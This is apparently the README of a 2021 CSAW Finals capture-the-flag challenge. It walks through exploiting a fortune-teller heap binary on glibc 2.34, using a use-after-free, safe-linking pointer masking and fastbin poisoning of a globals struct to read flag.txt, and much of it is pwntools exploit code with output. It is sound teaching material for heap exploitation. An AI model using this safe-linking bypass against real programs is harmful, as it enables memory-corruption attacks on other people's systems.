# horrorscope
2021 CSAW Finals pwn challenge walkthrough. This repository includes source code, though challengers only received the binary during the competition.

## Challenge Description
This is a pwn challenge that requires bypassing new glibc "safe-linking" on the heap. You can read more about the new safe-linking feature in Check Point Research's [blog post](https://research.checkpoint.com/2020/safe-linking-eliminating-a-20-year-old-malloc-exploit-primitive/). In essence, safe-linking attempts to eliminate common heap exploitation strategies such as fastbins dup and tcache poisoning by obscuring `fw` and `bk` pointers on the heap. This challenge shows that, given a few potentially common primitives, this mitigation falls short of preventing exploitation and RCE.

Furthermore, this binary challenges competitors by restricting heap allocations to predetermined sizes. This makes for a harder challenge as heap feng shui must be performed without user control of chunk sizes.

To top it off, glibc >v2.32 also removes `__malloc_hook`, `__realloc_hook`, and `__free_hook` functionality. The parameters still exist, but are *not* called during their associated functions. Therefore, traditional strategies of overwriting these glibc addresses do not work for this challenge.  

## Comments on Environment Configuration
This challenge runs on glibc 2.34 to incorporate safe-linking. The easiest way to mimic the environment is to set up a Docker container running Ubuntu:21.10 or later (example Dockerfile included in this repo). Another alternative is to download and compile glibc v>2.32 on your host machine via [ray-cp's build.sh script](https://github.com/ray-cp/pwn_debug/blob/master/build.sh). Run the following commands to build and patch the binary to use glibc 2.34 on your local machine, even if your host runs a different version. 

```bash
./build.sh 2.34
patchelf --set-interpreter /glibc/x64/2.34/lib/ld-linux-x86-64.so.2 ./test
```

## Challenge Overview
The challenge is effectively an fortune teller, providing the user with the option to query astrological signs, ask a question to the Magic 8 Ball, receive a fortune cookie, and visit the oracle. Some options allow saving the fortune, which can later by read back. The user can also save and retrieve a lucky number. 

```
Welcome to the CSAW Oracle (v2.34)!!
We offer all manners of predicting your future and fate!
If you're lucky, that fate will include reading the ./flag.txt!!


 -----------------------------------------
 Option 0: Query horoscope sign birthdates
 Option 1: Ask the Magic 8 Ball a question
 Option 2: Open a fortune cookie
 Option 3: Read a saved 8 ball fortune
 Option 4: Read a saved cookie fortune
 Option 5: Delete a saved 8 ball fortune
 Option 6: Visit the Oracle
 Option 7: Get Lucky Number
 Option 8: Save Lucky Number
 Option 9: Exit
 > 
```

This looks like a fairly straightforward heap challenge, where users control the heap layout without interference from other threads or operations. There are a few heap allocations available:
 
```c
char* question = malloc(0x70);  // 8 Ball user input
char* buf = malloc(0x390);      // oracle fortune
globals.sign = calloc(1, 12);   // horoscope sign
struct cookie_s* cookie = calloc(1, sizeof(struct cookie_s)); // fortune cookie, also 0x70
globals.lucky_number = calloc(1, 0x8); // save lucky number
globals.name = calloc(1, 0x10); // get lucky number
```

The binary frees memory in a few locations: 

```c
free(question);         // free 8 Ball question on error 
free(question);         // free 8 Ball question (user control)
free(c[index++].next);  // delete fortune cookie (required when fortune array is full)
free(f[globals.num_8ball_fortunes].question); // delete 8 Ball fortune
free(buf);              // free oracle fortune (no user control)
free(globals.lucky_number); // free lucky number (user control)
```

Given symbols (which were not provided to competitors), it is easy to see there are some globals defined in the binary. These are key later in the exploit. 

```c
struct {
    char* sign;
    long curr_cookie_index;
    char* oracle_file;
    long oracle_file_lines;
    char* cookie_file;
    long cookie_file_lines;
    long num_8ball_fortunes;
    unsigned long* lucky_number;
    char* name;
} globals = {0, 0, "oracle.txt\0", 11, "cookies.txt\0", 52, 0, 0};

struct cookie_LL c[MAX_COOKIES];
struct eightball f[MAX_FORTUNE_ENTRIES];
```

## Vulnerabilities
This binary contains two intentional vulnerabilities which, when used in combination, can bypass security mitigations to gain arbitrary read privileges on the target file system. 

* The unlink function (`delete_cookie`) unlinks a fortune cookie fortune when the array is filled with incorrect logic. The unlinked index is incorrectly incremented after it is freed but before it updates link logic. The result is a dangling pointer to the freed index and a corrupted linked list prior to the unlinked index. Note that indices after (greater than) the freed index are not corrupted.  
    * There is an additional vulnerability in this logic: when the challenger frees the last index, the binary frees the index but does not update the linked list. This means there is no update to the global counter variable which tracks the number of allocated indices, so no new objects are permitted.  Furthermore, the final index does not corrupt the link check logic, so it can be freed multiple times without consequence

```c
// update linked lists
free(c[index++].next);
for (; index < globals.curr_cookie_index; index++) {
    if (index != 0) {
        c[index].prev = c[index].next;
        c[index].next->next = (unsigned int *)&c[index - 1];
    }
    if (index != MAX_COOKIES - 1) {
        c[index].next = c[index + 1].next;
    }
    else {
        c[index].prev = 0;
        c[index].next = 0;
        globals.curr_cookie_index--;
    }
}
```

* The second, more minor, vulnerability is an incorrectly implemented `read` call in the `ask_8ball` function. The function null terminates the chunk, but does not terminate immediately after the input. This is not immediately noticeable when dealing with a fresh heap, since null bytes on the heap terminate the string printout automatically. However, it does allow memory leaks by reading past the end of user input.

```c
printf(" Ask a question to the magic 8 ball\n > ");
read(0, question + 17, 0x70 - 17);
question[0x6f] = '\0';
```

## Exploit Walkthrough
### Leak a Heap Address
Leaking a heap address with the first vulnerability is simple. Filling the fortune cookie array and then choosing an index to delete creates a UAF . It is useful to delete an early (low) index so that the same vulnerability can be used later in the exploit. Reading this index after freeing it leaks the address in the first quadword.  If the chunk is in either tcache or fastbins (which can be forced by allocating and freeing Magic 8 Ball questions), then this is pointer to the `fw` chunk.  However, this chunk is not a valid heap address as it would be pre-2.32 glibc; instead the pointer is "protected" with safe-linking. This still does provide valuable information. If the freed chunk is near the beginning of the heap, the leaked memory address reveals the heap starting address by ignoring the lowest three nibbles and shifting the leaked pointer left by 12 bits. *Note: this assumes the chunk is not `>0xfff` bytes after the start of the heap. If this were the case, the obfuscated pointer's most significant 5 nibbles would not match the heap starting address.* **This works because safe-linking two heap pointers only obfuscates the last 3 nibbles, and the heap start always starts on a `0x1000` aligned address**.

```python
# free UAF with link in fastbins
resp = cookie()
assert resp == b' You have no room to save any more fortunes. Please choose one to delete\n'
p.send(b'0\n')
p.recvuntil(b' > ')

# leak heap address
# only read 5 most significant nibbles
leak = int.from_bytes(read_cookie(0)[2:7], "little") 
print(hex(leak)) 
heap_start = leak << 12
print(hex(heap_start))

assert (heap_start & 0xfff) == 0 
```

```
output:
0x55733b853
0x55733b853000
```

### Leak a .data Address
A tempting next step is to leak a glibc address using the UAF to return a `main_arena` address. This would be a very useful path forward in most challenges. However, as previously mentioned, glibc 2.34 removed `__malloc_hook` and `__free_hook` from allocation and deallocation calls. Therefore, the old friends that hijack `rip` are no longer available. FSOP is a logical next step, though this challenge presents a unique opportunity to leak the flag without touching glibc at all. Instead, the aforementioned `globals` struct in the data section is a vulnerable target. A clever challenger will notice that when the `globals.curr_cookie_index` value is maximized when it has a value of `0x21`, which is a valid chunk size parameter. Since the binary offers two allocation size options, 0x80 and 0x20, this is promising.

```c 
struct {
    char* sign;
    long curr_cookie_index; // max 0x21 when array is full
    char* oracle_file;
    long oracle_file_lines;
    char* cookie_file;
    long cookie_file_lines;
    long num_8ball_fortunes;
    unsigned long* lucky_number;
    char* name;
} globals = {0, 0, "oracle.txt\0", 11, "cookies.txt\0", 52, 0, 0};
```

Leaking a data address relies on both previously described vulnerabilities. The key is to allocate the previously created UAF chunk within a Magic 8 Ball fortune. Allocating a question buffer right up to the final quadword and printing the entry leaks the previously linked data address from the (admittedly weird) cookie linked list. Note that the second vulnerability does not replace the line feed (`\n`) character at the input's end, but rather the last byte in the `0x70` buffer.  This therefore overwrites the least significant byte in the linked .data address. That is not a problem, since the goal is fingerprinting where the .data segment starts, which likely has a `0x00` most significant byte anyway. From there, the address of the `globals` structure is a static offset from the .data start. 

```c
struct cookie_s {
  char fortune[0x68];
  unsigned int *next; // print this pointer after reallocating in 8 Ball question
};
```

```python
# alloc UAF into 8ball and fill up to the data segment address, read fortune to leak data address
for _ in range(0, 7):
eightball(b"flag.txt\0", 'Y')
eightball(b"A" * (0x68 - 17), 'Y')
leak = read_8ball(8)
rough_leak = int.from_bytes(b'\x00' + leak.split(b'\n')[1][:], "little")
print(hex(rough_leak))
data_base = rough_leak & ~0xfff
global_addr = data_base + 0x20
print(hex(global_addr))

# fill last index in cookie array
resp = cookie()
```

```
debug output:
[DEBUG] Received 0x231 bytes:
    00000000  20 59 6f 75  72 20 51 75  65 73 74 69  6f 6e 3a 20  │ You│r Qu│esti│on: │
    00000010  20 20 20 20  20 20 4f 68  20 4d 61 67  69 63 20 38  │    │  Oh│ Mag│ic 8│
    00000020  20 42 61 6c  6c 2c 20 41  41 41 41 41  41 41 41 41  │ Bal│l, A│AAAA│AAAA│
    00000030  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000070  41 41 41 41  41 41 41 41  41 41 41 41  41 41 0a 10  │AAAA│AAAA│AAAA│AA··│
    00000080  b5 21 4f 56  0a 20 4d 61  67 69 63 20  38 20 62 61  │·!OV│· Ma│gic │8 ba│

output:
0x5630bdc8c000
0x5630bdc8c020
```

### Flip the UAF
There are two requirements for the `globals` overwrite strategy. The first is a corruptible 0x20 chunk to overwrite its `fw` pointer and the second is that this chunk resides in fastbins to avoid forging a doubly-linked list to pass the `p->fw->bk == p` check when allocating from tcache. The problem is the current UAF is in the 0x80 bin, not the 0x20 bin. Therefore, a UAF must be set up and pushed into the unsorted bin, making sure it is not sorted into the 0x80 (or larger) smallbin.  Some clever heap feng shui accomplishes this using a UAF on the last cookie index. Setting up the UAF is trivial and just involves filling tcache bins and freeing the last cookie. Pushing it to unsorted bins is more difficult, since there is no function that directly `malloc`s and `free`s a large chunk. A trick to do so is simply allocate a large input in the main menu prompt, which allocates and frees a temporary storage buffer. Since a `0x20` allocation is smaller than the `0x80` smallbin, any `calloc` call (since `calloc` bypasses tcache) pulls from unsorted bins if no fastbins or smallbins of matching size are available. 

```python
# alloc and free UAF in last index
resp = cookie()
assert resp == b' You have no room to save any more fortunes. Please choose one to delete\n'  
p.send(b'32\n')
p.recvuntil(b' > ')

# consolidate to push UAF chunk into unsorted bins
p.send(b'1' * 0x600 + b'\n')
```

Choosing the last index for the UAF allows the user to free this pointer multiple times due to the aforementioned vulnerability. This is important as it provides access to the dangling pointer in more than one locating. Allocating a `0x20` astrological sign allocates the UAF in the global variable, and freeing it again through the fortune cookie list also puts it in fastbins.

```python
# free UAF in index 32 to populate fastbins pointers, alloc UAF from unsorted bins into sign
delete_8ball()
sign(b'Aries')

# free sign using UAF into 0x20 fastbins 
resp = cookie()
assert resp == b' You have no room to save any more fortunes. Please choose one to delete\n'  
p.send(b'32\n')
p.recvuntil(b' > ')
``` 

Now, changing the saved sign to the `globals` address corrupts the fastbins linked list and provides an arbitrary pointer allocation. However, safe-linking calls `reveal` on the fastbins `fw` pointer to unmask the obfuscated pointer when allocated. Legitimately masking the `globals` address using safe-linking passes the `reveal` check.  Allocating two consecutive `0x20` chunks (using `store_lucky_num` and `get_lucky_num`) returns a pointer to `globals`.  Overwriting `0x10` bytes after the chunk start corrupts `char* oracle_file` and `long oracle_file_lines`.  Pointing this to `flag.txt` and `0x1` forces the next call to `oracle` to read from `flag.txt` instead of `oracle.txt`.  Finally, consulting the oracle returns the flag: 

```python
# edit sign (UAF), make sure to mask pointer
dest = global_addr
source = heap_start + 0x1720 # location on heap of globals.sign
masked_global_addr = dest ^ (source >> 12)
sign(masked_global_addr.to_bytes(8,"little"))
```

```
output:
`The oracle says: flag{S4f3-l1nk1nG_Do35n7_pr073c7_ur_GL0B4L5}`
```